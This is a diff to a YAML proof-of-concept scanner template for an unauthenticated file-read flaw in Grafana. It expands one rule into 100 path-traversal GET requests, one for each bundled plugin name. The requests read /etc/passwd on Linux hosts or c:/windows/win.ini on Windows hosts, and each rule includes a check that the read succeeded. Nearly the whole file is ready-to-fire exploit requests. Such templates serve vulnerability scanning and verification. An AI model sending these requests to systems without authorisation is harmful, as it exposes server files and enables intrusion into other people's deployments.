@@ -1,15 +1,609 @@
 name: poc-yaml-grafana-unauth-fileread
 transport: http
 rules:
-    r1:
+    alertGroupsRule:
         request:
             method: GET
-            path: "/public/plugins/mysql/../../../../../../../../../../../../../../../../../etc/passwd"
+            path: /public/plugins/alertGroups/../../../../../../../../../etc/passwd
         expression: |
             response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    alertlistRule:
+        request:
+            method: GET
+            path: /public/plugins/alertlist/../../../../../../../../../etc/passwd
+        expression: |
+            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    alertmanagerRule:
+        request:
+            method: GET
+            path: /public/plugins/alertmanager/../../../../../../../../../etc/passwd
+        expression: |
+            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    annolistRule:
+        request:
+            method: GET
+            path: /public/plugins/annolist/../../../../../../../../../etc/passwd
+        expression: |
+            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    barchartRule:
+        request:
+            method: GET
+            path: /public/plugins/barchart/../../../../../../../../../etc/passwd
+        expression: |
+            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    bargaugeRule:
+        request:
+            method: GET
+            path: /public/plugins/bargauge/../../../../../../../../../etc/passwd
+        expression: |
+            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    canvasRule:
+        request:
+            method: GET
+            path: /public/plugins/canvas/../../../../../../../../../etc/passwd
+        expression: |
+            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    cloudwatchRule:
+        request:
+            method: GET
+            path: /public/plugins/cloudwatch/../../../../../../../../../etc/passwd
+        expression: |
+            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    dashboardRule:
+        request:
+            method: GET
+            path: /public/plugins/dashboard/../../../../../../../../../etc/passwd
+        expression: |
+            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    dashlistRule:
+        request:
+            method: GET
+            path: /public/plugins/dashlist/../../../../../../../../../etc/passwd
+        expression: |
+            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    debugRule:
+        request:
+            method: GET
+            path: /public/plugins/debug/../../../../../../../../../etc/passwd
+        expression: |
+            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    elasticsearchRule:
+        request:
+            method: GET
+            path: /public/plugins/elasticsearch/../../../../../../../../../etc/passwd
+        expression: |
+            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    gaugeRule:
+        request:
+            method: GET
+            path: /public/plugins/gauge/../../../../../../../../../etc/passwd
+        expression: |
+            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    geomapRule:
+        request:
+            method: GET
+            path: /public/plugins/geomap/../../../../../../../../../etc/passwd
+        expression: |
+            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    gettingstartedRule:
+        request:
+            method: GET
+            path: /public/plugins/gettingstarted/../../../../../../../../../etc/passwd
+        expression: |
+            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    grafanaRule:
+        request:
+            method: GET
+            path: /public/plugins/grafana/../../../../../../../../../etc/passwd
+        expression: |
+            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    grafana_azure_monitor_datasourceRule:
+        request:
+            method: GET
+            path: /public/plugins/grafana-azure-monitor-datasource/../../../../../../../../../etc/passwd
+        expression: |
+            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    grafana_clock_panelRule:
+        request:
+            method: GET
+            path: /public/plugins/grafana-clock-panel/../../../../../../../../../etc/passwd
+        expression: |
+            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    graphRule:
+        request:
+            method: GET
+            path: /public/plugins/graph/../../../../../../../../../etc/passwd
+        expression: |
+            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    graphiteRule:
+        request:
+            method: GET
+            path: /public/plugins/graphite/../../../../../../../../../etc/passwd
+        expression: |
+            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    heatmapRule:
+        request:
+            method: GET
+            path: /public/plugins/heatmap/../../../../../../../../../etc/passwd
+        expression: |
+            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    histogramRule:
+        request:
+            method: GET
+            path: /public/plugins/histogram/../../../../../../../../../etc/passwd
+        expression: |
+            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    iconRule:
+        request:
+            method: GET
+            path: /public/plugins/icon/../../../../../../../../../etc/passwd
+        expression: |
+            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    influxdbRule:
+        request:
+            method: GET
+            path: /public/plugins/influxdb/../../../../../../../../../etc/passwd
+        expression: |
+            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    jaegerRule:
+        request:
+            method: GET
+            path: /public/plugins/jaeger/../../../../../../../../../etc/passwd
+        expression: |
+            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    liveRule:
+        request:
+            method: GET
+            path: /public/plugins/live/../../../../../../../../../etc/passwd
+        expression: |
+            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    logsRule:
+        request:
+            method: GET
+            path: /public/plugins/logs/../../../../../../../../../etc/passwd
+        expression: |
+            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    lokiRule:
+        request:
+            method: GET
+            path: /public/plugins/loki/../../../../../../../../../etc/passwd
+        expression: |
+            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    mixedRule:
+        request:
+            method: GET
+            path: /public/plugins/mixed/../../../../../../../../../etc/passwd
+        expression: |
+            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    mssqlRule:
+        request:
+            method: GET
+            path: /public/plugins/mssql/../../../../../../../../../etc/passwd
+        expression: |
+            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    mysqlRule:
+        request:
+            method: GET
+            path: /public/plugins/mysql/../../../../../../../../../etc/passwd
+        expression: |
+            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    newsRule:
+        request:
+            method: GET
+            path: /public/plugins/news/../../../../../../../../../etc/passwd
+        expression: |
+            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    nodeGraphRule:
+        request:
+            method: GET
+            path: /public/plugins/nodeGraph/../../../../../../../../../etc/passwd
+        expression: |
+            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    opentsdbRule:
+        request:
+            method: GET
+            path: /public/plugins/opentsdb/../../../../../../../../../etc/passwd
+        expression: |
+            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    piechartRule:
+        request:
+            method: GET
+            path: /public/plugins/piechart/../../../../../../../../../etc/passwd
+        expression: |
+            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    pluginlistRule:
+        request:
+            method: GET
+            path: /public/plugins/pluginlist/../../../../../../../../../etc/passwd
+        expression: |
+            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    postgresRule:
+        request:
+            method: GET
+            path: /public/plugins/postgres/../../../../../../../../../etc/passwd
+        expression: |
+            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    prometheusRule:
+        request:
+            method: GET
+            path: /public/plugins/prometheus/../../../../../../../../../etc/passwd
+        expression: |
+            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    statRule:
+        request:
+            method: GET
+            path: /public/plugins/stat/../../../../../../../../../etc/passwd
+        expression: |
+            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    state_timelineRule:
+        request:
+            method: GET
+            path: /public/plugins/state-timeline/../../../../../../../../../etc/passwd
+        expression: |
+            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    status_historyRule:
+        request:
+            method: GET
+            path: /public/plugins/status-history/../../../../../../../../../etc/passwd
+        expression: |
+            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    tableRule:
+        request:
+            method: GET
+            path: /public/plugins/table/../../../../../../../../../etc/passwd
+        expression: |
+            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    table_oldRule:
+        request:
+            method: GET
+            path: /public/plugins/table-old/../../../../../../../../../etc/passwd
+        expression: |
+            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    tempoRule:
+        request:
+            method: GET
+            path: /public/plugins/tempo/../../../../../../../../../etc/passwd
+        expression: |
+            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    testdataRule:
+        request:
+            method: GET
+            path: /public/plugins/testdata/../../../../../../../../../etc/passwd
+        expression: |
+            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    textRule:
+        request:
+            method: GET
+            path: /public/plugins/text/../../../../../../../../../etc/passwd
+        expression: |
+            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    timeseriesRule:
+        request:
+            method: GET
+            path: /public/plugins/timeseries/../../../../../../../../../etc/passwd
+        expression: |
+            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    welcomeRule:
+        request:
+            method: GET
+            path: /public/plugins/welcome/../../../../../../../../../etc/passwd
+        expression: |
+            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    xychartRule:
+        request:
+            method: GET
+            path: /public/plugins/xychart/../../../../../../../../../etc/passwd
+        expression: |
+            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    zipkinRule:
+        request:
+            method: GET
+            path: /public/plugins/zipkin/../../../../../../../../../etc/passwd
+        expression: |
+            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    alertGroupsWinRule:
+        request:
+            method: GET
+            path: /public/plugins/alertGroups/../../../../../../../../../../../c:/windows/win.ini
+        expression: |
+            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+    alertlistWinRule:
+        request:
+            method: GET
+            path: /public/plugins/alertlist/../../../../../../../../../../../c:/windows/win.ini
+        expression: |
+            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+    alertmanagerWinRule:
+        request:
+            method: GET
+            path: /public/plugins/alertmanager/../../../../../../../../../../../c:/windows/win.ini
+        expression: |
+            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+    annolistWinRule:
+        request:
+            method: GET
+            path: /public/plugins/annolist/../../../../../../../../../../../c:/windows/win.ini
+        expression: |
+            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+    barchartWinRule:
+        request:
+            method: GET
+            path: /public/plugins/barchart/../../../../../../../../../../../c:/windows/win.ini
+        expression: |
+            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+    bargaugeWinRule:
+        request:
+            method: GET
+            path: /public/plugins/bargauge/../../../../../../../../../../../c:/windows/win.ini
+        expression: |
+            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+    canvasWinRule:
+        request:
+            method: GET
+            path: /public/plugins/canvas/../../../../../../../../../../../c:/windows/win.ini
+        expression: |
+            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+    cloudwatchWinRule:
+        request:
+            method: GET
+            path: /public/plugins/cloudwatch/../../../../../../../../../../../c:/windows/win.ini
+        expression: |
+            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+    dashboardWinRule:
+        request:
+            method: GET
+            path: /public/plugins/dashboard/../../../../../../../../../../../c:/windows/win.ini
+        expression: |
+            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+    dashlistWinRule:
+        request:
+            method: GET
+            path: /public/plugins/dashlist/../../../../../../../../../../../c:/windows/win.ini
+        expression: |
+            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+    debugWinRule:
+        request:
+            method: GET
+            path: /public/plugins/debug/../../../../../../../../../../../c:/windows/win.ini
+        expression: |
+            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+    elasticsearchWinRule:
+        request:
+            method: GET
+            path: /public/plugins/elasticsearch/../../../../../../../../../../../c:/windows/win.ini
+        expression: |
+            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+    gaugeWinRule:
+        request:
+            method: GET
+            path: /public/plugins/gauge/../../../../../../../../../../../c:/windows/win.ini
+        expression: |
+            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+    geomapWinRule:
+        request:
+            method: GET
+            path: /public/plugins/geomap/../../../../../../../../../../../c:/windows/win.ini
+        expression: |
+            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+    gettingstartedWinRule:
+        request:
+            method: GET
+            path: /public/plugins/gettingstarted/../../../../../../../../../../../c:/windows/win.ini
+        expression: |
+            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+    grafanaWinRule:
+        request:
+            method: GET
+            path: /public/plugins/grafana/../../../../../../../../../../../c:/windows/win.ini
+        expression: |
+            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+    grafana_azure_monitor_datasourceWinRule:
+        request:
+            method: GET
+            path: /public/plugins/grafana-azure-monitor-datasource/../../../../../../../../../../../c:/windows/win.ini
+        expression: |
+            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+    grafana_clock_panelWinRule:
+        request:
+            method: GET
+            path: /public/plugins/grafana-clock-panel/../../../../../../../../../../../c:/windows/win.ini
+        expression: |
+            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+    graphWinRule:
+        request:
+            method: GET
+            path: /public/plugins/graph/../../../../../../../../../../../c:/windows/win.ini
+        expression: |
+            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+    graphiteWinRule:
+        request:
+            method: GET
+            path: /public/plugins/graphite/../../../../../../../../../../../c:/windows/win.ini
+        expression: |
+            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+    heatmapWinRule:
+        request:
+            method: GET
+            path: /public/plugins/heatmap/../../../../../../../../../../../c:/windows/win.ini
+        expression: |
+            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+    histogramWinRule:
+        request:
+            method: GET
+            path: /public/plugins/histogram/../../../../../../../../../../../c:/windows/win.ini
+        expression: |
+            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+    iconWinRule:
+        request:
+            method: GET
+            path: /public/plugins/icon/../../../../../../../../../../../c:/windows/win.ini
+        expression: |
+            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+    influxdbWinRule:
+        request:
+            method: GET
+            path: /public/plugins/influxdb/../../../../../../../../../../../c:/windows/win.ini
+        expression: |
+            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+    jaegerWinRule:
+        request:
+            method: GET
+            path: /public/plugins/jaeger/../../../../../../../../../../../c:/windows/win.ini
+        expression: |
+            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+    liveWinRule:
+        request:
+            method: GET
+            path: /public/plugins/live/../../../../../../../../../../../c:/windows/win.ini
+        expression: |
+            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+    logsWinRule:
+        request:
+            method: GET
+            path: /public/plugins/logs/../../../../../../../../../../../c:/windows/win.ini
+        expression: |
+            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+    lokiWinRule:
+        request:
+            method: GET
+            path: /public/plugins/loki/../../../../../../../../../../../c:/windows/win.ini
+        expression: |
+            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+    mixedWinRule:
+        request:
+            method: GET
+            path: /public/plugins/mixed/../../../../../../../../../../../c:/windows/win.ini
+        expression: |
+            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+    mssqlWinRule:
+        request:
+            method: GET
+            path: /public/plugins/mssql/../../../../../../../../../../../c:/windows/win.ini
+        expression: |
+            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+    mysqlWinRule:
+        request:
+            method: GET
+            path: /public/plugins/mysql/../../../../../../../../../../../c:/windows/win.ini
+        expression: |
+            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+    newsWinRule:
+        request:
+            method: GET
+            path: /public/plugins/news/../../../../../../../../../../../c:/windows/win.ini
+        expression: |
+            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+    nodeGraphWinRule:
+        request:
+            method: GET
+            path: /public/plugins/nodeGraph/../../../../../../../../../../../c:/windows/win.ini
+        expression: |
+            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+    opentsdbWinRule:
+        request:
+            method: GET
+            path: /public/plugins/opentsdb/../../../../../../../../../../../c:/windows/win.ini
+        expression: |
+            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+    piechartWinRule:
+        request:
+            method: GET
+            path: /public/plugins/piechart/../../../../../../../../../../../c:/windows/win.ini
+        expression: |
+            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+    pluginlistWinRule:
+        request:
+            method: GET
+            path: /public/plugins/pluginlist/../../../../../../../../../../../c:/windows/win.ini
+        expression: |
+            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+    postgresWinRule:
+        request:
+            method: GET
+            path: /public/plugins/postgres/../../../../../../../../../../../c:/windows/win.ini
+        expression: |
+            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+    prometheusWinRule:
+        request:
+            method: GET
+            path: /public/plugins/prometheus/../../../../../../../../../../../c:/windows/win.ini
+        expression: |
+            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+    statWinRule:
+        request:
+            method: GET
+            path: /public/plugins/stat/../../../../../../../../../../../c:/windows/win.ini
+        expression: |
+            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+    state_timelineWinRule:
+        request:
+            method: GET
+            path: /public/plugins/state-timeline/../../../../../../../../../../../c:/windows/win.ini
+        expression: |
+            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+    status_historyWinRule:
+        request:
+            method: GET
+            path: /public/plugins/status-history/../../../../../../../../../../../c:/windows/win.ini
+        expression: |
+            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+    tableWinRule:
+        request:
+            method: GET
+            path: /public/plugins/table/../../../../../../../../../../../c:/windows/win.ini
+        expression: |
+            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+    table_oldWinRule:
+        request:
+            method: GET
+            path: /public/plugins/table-old/../../../../../../../../../../../c:/windows/win.ini
+        expression: |
+            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+    tempoWinRule:
+        request:
+            method: GET
+            path: /public/plugins/tempo/../../../../../../../../../../../c:/windows/win.ini
+        expression: |
+            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+    testdataWinRule:
+        request:
+            method: GET
+            path: /public/plugins/testdata/../../../../../../../../../../../c:/windows/win.ini
+        expression: |
+            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+    textWinRule:
+        request:
+            method: GET
+            path: /public/plugins/text/../../../../../../../../../../../c:/windows/win.ini
+        expression: |
+            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+    timeseriesWinRule:
+        request:
+            method: GET
+            path: /public/plugins/timeseries/../../../../../../../../../../../c:/windows/win.ini
+        expression: |
+            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+    welcomeWinRule:
+        request:
+            method: GET
+            path: /public/plugins/welcome/../../../../../../../../../../../c:/windows/win.ini
+        expression: |
+            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+    xychartWinRule:
+        request:
+            method: GET
+            path: /public/plugins/xychart/../../../../../../../../../../../c:/windows/win.ini
+        expression: |
+            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+    zipkinWinRule:
+        request:
+            method: GET
+            path: /public/plugins/zipkin/../../../../../../../../../../../c:/windows/win.ini
+        expression: |
+            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
 expression:
-    r1()
+    alertGroupsRule() || alertlistRule() || alertmanagerRule() || annolistRule() || barchartRule() || bargaugeRule() || canvasRule() || cloudwatchRule() || dashboardRule() || dashlistRule() || debugRule() || elasticsearchRule() || gaugeRule() || geomapRule() || gettingstartedRule() || grafanaRule() || grafana_azure_monitor_datasourceRule() || grafana_clock_panelRule() || graphRule() || graphiteRule() || heatmapRule() || histogramRule() || iconRule() || influxdbRule() || jaegerRule() || liveRule() || logsRule() || lokiRule() || mixedRule() || mssqlRule() || mysqlRule() || newsRule() || nodeGraphRule() || opentsdbRule() || piechartRule() || pluginlistRule() || postgresRule() || prometheusRule() || statRule() || state_timelineRule() || status_historyRule() || tableRule() || table_oldRule() || tempoRule() || testdataRule() || textRule() || timeseriesRule() || welcomeRule() || xychartRule() || zipkinRule() || alertGroupsWinRule() || alertlistWinRule() || alertmanagerWinRule() || annolistWinRule() || barchartWinRule() || bargaugeWinRule() || canvasWinRule() || cloudwatchWinRule() || dashboardWinRule() || dashlistWinRule() || debugWinRule() || elasticsearchWinRule() || gaugeWinRule() || geomapWinRule() || gettingstartedWinRule() || grafanaWinRule() || grafana_azure_monitor_datasourceWinRule() || grafana_clock_panelWinRule() || graphWinRule() || graphiteWinRule() || heatmapWinRule() || histogramWinRule() || iconWinRule() || influxdbWinRule() || jaegerWinRule() || liveWinRule() || logsWinRule() || lokiWinRule() || mixedWinRule() || mssqlWinRule() || mysqlWinRule() || newsWinRule() || nodeGraphWinRule() || opentsdbWinRule() || piechartWinRule() || pluginlistWinRule() || postgresWinRule() || prometheusWinRule() || statWinRule() || state_timelineWinRule() || status_historyWinRule() || tableWinRule() || table_oldWinRule() || tempoWinRule() || testdataWinRule() || textWinRule() || timeseriesWinRule() || welcomeWinRule() || xychartWinRule() || zipkinWinRule()
 detail:
-    author: fuping(link)
+    author: fuping(x)
     links:
         - https://twitter.com/hacker_/status/1467880514489044993
